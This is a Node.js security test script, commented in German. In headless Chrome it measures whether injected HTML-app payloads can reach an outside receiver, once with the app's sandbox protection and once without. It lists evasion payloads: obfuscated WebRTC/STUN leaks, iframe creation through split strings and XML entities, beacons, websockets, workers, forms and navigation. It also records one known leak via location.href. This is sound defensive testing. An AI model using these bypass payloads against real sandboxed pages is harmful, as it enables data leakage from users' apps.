#!/usr/bin/env node
/**
 * Angriffe auf den Sandkasten der HTML-Apps, im echten Browser (docs/html-apps.md, „Sicherheit“).
 * Zählt, was an einem fremden Server ankommt, einmal ohne und einmal mit Schutz. Die Kontrolle ohne
 * Schutz zeigt, dass die Messung überhaupt etwas sehen kann.
 *
 *   npx nest build && node scripts/html-app-sicherheitstest.js
 *
 * Braucht Chrome (CHROME=/pfad, sonst /usr/bin/google-chrome) und eine LAN-Adresse. Nach jedem größeren
 * Chrome-Update und jeder Änderung an Schutzskript oder Kopfzeilen laufen lassen; das iPad prüft das nicht.
 */
const http = require('http');
const dgram = require('dgram');
const os = require('os');
const path = require('path');
const puppeteer = require('puppeteer-core');
const { deliverable, inspectApp } = require(path.join(__dirname, '../dist/html-apps/html-app-check'));
const { appHeaders } = require(path.join(__dirname, '../dist/html-apps/html-app-rules'));

const ip = Object.values(os.networkInterfaces()).flat().find((i) => i.family === 'IPv4' && !i.internal)?.address;
if (!ip) { console.error('Keine LAN-Adresse gefunden.'); process.exit(2); }
const PORT = 18821;
const EXIT = 18822;
const UDP = 18900;
const ORIGIN = `http://127.0.0.1:${PORT}`;
const PARENT = `http://localhost:${PORT}`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const rtc = (ctor, port) => `const C = ${ctor}; const p = new C({ iceServers: [{ urls: 'stun:${ip}:${port}' }] }); p.createDataChannel('x'); p.createOffer().then((o) => p.setLocalDescription(o));`;
const fresh = (make, port) => `const f = (() => { ${make} })(); const win = (f && f.contentWindow) || window[0]; ${rtc('win.RTCPeerConnection', port)}`;
const U = `http://${ip}:${EXIT}`;

/** Name → Skript. `port` ist der Empfänger dieses Angriffs. */
const WEBRTC = {
  direkt: (p) => rtc('RTCPeerConnection', p),
  verschleiert: (p) => rtc("self['RTC' + 'Peer' + 'Connection']", p),
  aufzaehlen: (p) => rtc('window[Object.getOwnPropertyNames(window).find((k) => /PeerConn/.test(k))]', p),
  'rahmen-createElement': (p) => fresh("const f = document['create' + 'Element']('ifr' + 'ame'); document.body.appendChild(f); return f;", p),
  'rahmen-innerHTML': (p) => fresh("const d = document.createElement('div'); document.body.appendChild(d); d.innerHTML = '<IfRaMe/x></IFRAME>'; return document.querySelector('iframe');", p),
  'rahmen-createDocument': (p) => fresh("const r = document.implementation.createDocument('http://www.w3.org/1999/xhtml', 'iframe').documentElement; document.body.appendChild(r); return r;", p),
  'rahmen-xml': (p) => fresh(`const s = '<!DOCTYPE r [<!ENTITY e "&#60;iframe xmlns=\\'http://www.w3.org/1999/xhtml\\'/&#62;">]><r>&e;</r>'; const r = new DOMParser().parseFromString(s, 'application/xml').documentElement.firstChild; document.body.appendChild(r); return r;`, p),
  'rahmen-write-teile': (p) => fresh("document.write('<ifr'); document.write('ame></ifr'); document.write('ame>'); return document.querySelector('iframe');", p),
  'rahmen-srcdoc': (p) => `const f = document['create' + 'Element']('iframe'); f.srcdoc = '<script>${rtc('RTCPeerConnection', p).replace(/'/g, "\\'")}<\\/script>'; document.body.appendChild(f);`,
};
const NETZ = {
  fetch: () => `fetch('${U}/fetch', { mode: 'no-cors' }).catch(() => {});`,
  bild: () => `new Image().src = '${U}/bild';`,
  css: () => `const s = document.createElement('style'); s.textContent = 'body{background:url(${U}/css)}'; document.head.appendChild(s);`,
  beacon: () => `navigator.sendBeacon('${U}/beacon', 'x');`,
  websocket: () => `new (self['Web' + 'Socket'])('ws://${ip}:${EXIT}/ws');`,
  preconnect: () => `const l = document.createElement('link'); l.rel = 'preconnect'; l.href = '${U}/pre'; document.head.appendChild(l);`,
  fenster: () => `window.open('${U}/open');`,
  worker: () => `new Worker(URL.createObjectURL(new Blob(['fetch("${U}/worker")'])));`,
  'link-click': () => `const a = document.createElement('a'); a.href = '${U}/a'; document.body.appendChild(a); a.click();`,
  'link-event': () => `const a = document.createElement('a'); a.href = '${U}/ev'; a.dispatchEvent(new MouseEvent('click'));`,
  formular: () => `const f = document.createElement('form'); f.action = '${U}/form'; f.method = 'post'; document.body.appendChild(f); f.submit();`,
};
/** Bekannte Lücke: Der blockierte Seitenwechsel löst den Namen trotzdem auf und verbindet sich. */
const BEKANNT = {
  'location (bekannte Lücke)': () => `setTimeout(() => { self['loc' + 'ation']['hr' + 'ef'] = '${U}/nav'; }, 50);`,
};

const page = (js) => `<!doctype html><html><head><meta charset="utf-8"><title>a</title></head><body><p>x</p><script>try { ${js} } catch (e) { console.log('abgewehrt: ' + e.message); }</script></body></html>`;
const shieldOn = (html) => {
  const { scripts } = inspectApp(html); // Fehler egal: Der Test greift auch an, was die Prüfung ablehnen würde.
  const d = deliverable(html, scripts);
  return { html: d.html, headers: appHeaders(ORIGIN, PARENT, d.scriptHashes) };
};
const shieldOff = (html) => ({
  html,
  headers: { 'Content-Security-Policy': `sandbox allow-scripts allow-modals allow-downloads allow-forms; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; form-action 'none'; base-uri 'none'` },
});

let current = null;
let run_ = 0; // Jeder Lauf eine eigene Adresse: Die App-Seite darf im Browser-Speicher liegen.
const server = http.createServer((q, r) => {
  const u = q.url.split('?')[0];
  r.setHeader('Content-Type', 'text/html; charset=utf-8');
  if (u === '/') return r.end(`<!doctype html><iframe src="${ORIGIN}/shell?n=${run_}" sandbox="allow-scripts allow-same-origin allow-modals allow-downloads allow-forms"></iframe>`);
  if (u === '/shell') {
    r.setHeader('Content-Security-Policy', "default-src 'none'; style-src 'unsafe-inline'; frame-src 'self'");
    return r.end(`<!doctype html><iframe sandbox="allow-scripts allow-modals allow-forms" src="/app?n=${run_}"></iframe>`);
  }
  if (u === '/app') {
    for (const [k, v] of Object.entries(current.headers)) r.setHeader(k, v);
    return r.end(current.html);
  }
  r.statusCode = 404;
  return r.end();
});
let hits = 0;
const exit = http.createServer((q, r) => { hits++; r.end('x'); });
exit.on('connection', () => { hits++; });
exit.on('upgrade', (q, s) => { hits++; s.destroy(); });

/** Je Versuch ein eigener Browser: Sonst nutzt Chrome offene Verbindungen weiter und der Empfänger sieht nichts. */
const launch = () => puppeteer.launch({
  executablePath: process.env.CHROME || '/usr/bin/google-chrome', headless: true,
  args: ['--no-sandbox', '--disable-features=LocalNetworkAccessChecks,BlockInsecurePrivateNetworkRequests'],
});

async function attempt(port) {
  let stun = 0;
  hits = 0;
  const sock = dgram.createSocket('udp4');
  sock.on('message', () => { stun++; });
  await new Promise((r) => sock.bind(port, ip, r));
  run_++;
  const browser = await launch();
  const p = await browser.newPage();
  await p.goto(`${PARENT}/?n=${run_}`);
  await sleep(1800);
  await browser.close();
  sock.close();
  return { stun, hits };
}

(async () => {
  await new Promise((r) => server.listen(PORT, r));
  await new Promise((r) => exit.listen(EXIT, ip, r));
  let bad = 0;
  let controlSaw = 0;
  const run = async (name, build, known) => {
    const port = UDP;
    const js = build(port);
    current = shieldOff(page(js));
    const off = await attempt(port);
    current = shieldOn(page(js));
    const on = await attempt(port);
    const offN = off.stun + off.hits;
    const onN = on.stun + on.hits;
    if (offN) controlSaw++;
    const leak = onN > 0;
    if (leak && !known) bad++;
    console.log(`${leak ? (known ? 'BEKANNT' : 'FEHLER ') : 'OK     '} ${name.padEnd(28)} ohne Schutz: ${String(offN).padStart(2)}   mit Schutz: ${onN}`);
  };
  for (const [n, b] of Object.entries(WEBRTC)) await run(`WebRTC ${n}`, b, false);
  for (const [n, b] of Object.entries(NETZ)) await run(`Netz ${n}`, b, false);
  for (const [n, b] of Object.entries(BEKANNT)) await run(n, b, true);
  server.close();
  exit.close();
  if (!controlSaw) { console.error('\nDie Kontrolle hat nichts gemessen: Der Test sagt so nichts aus.'); process.exit(2); }
  console.log(bad ? `\n${bad} Angriff(e) kamen durch.` : '\nAlle nicht als bekannt vermerkten Angriffe wurden abgewehrt.');
  process.exit(bad ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(2); });
